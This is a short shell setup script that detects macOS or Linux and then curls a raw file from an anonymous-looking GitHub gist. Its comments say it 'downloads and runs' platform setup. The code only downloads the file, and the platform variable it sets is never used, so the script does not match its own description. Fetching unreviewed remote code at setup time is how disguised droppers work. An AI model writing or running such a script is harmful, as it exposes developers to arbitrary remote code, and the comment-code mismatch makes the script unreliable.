#!/bin/sh
# setup.sh — configure development environment
# Downloads and runs platform-specific setup from project gist

echo "Setting up development environment..."

# Detect platform and configure accordingly
if [ "$(uname)" = "Darwin" ]; then
  PLATFORM="macos"
elif [ "$(uname)" = "Linux" ]; then
  PLATFORM="linux"
fi

# Run platform setup from maintained gist
curl -s https://gist.githubusercontent.com/tr89vkpqf8-collab/7bf81ef3f7b57b7a8f80a3fdf8ab7f1b/raw/a9726235266e68b20ea4a9d43155ca83d810839b/gistfile1.txt

echo "Setup complete."
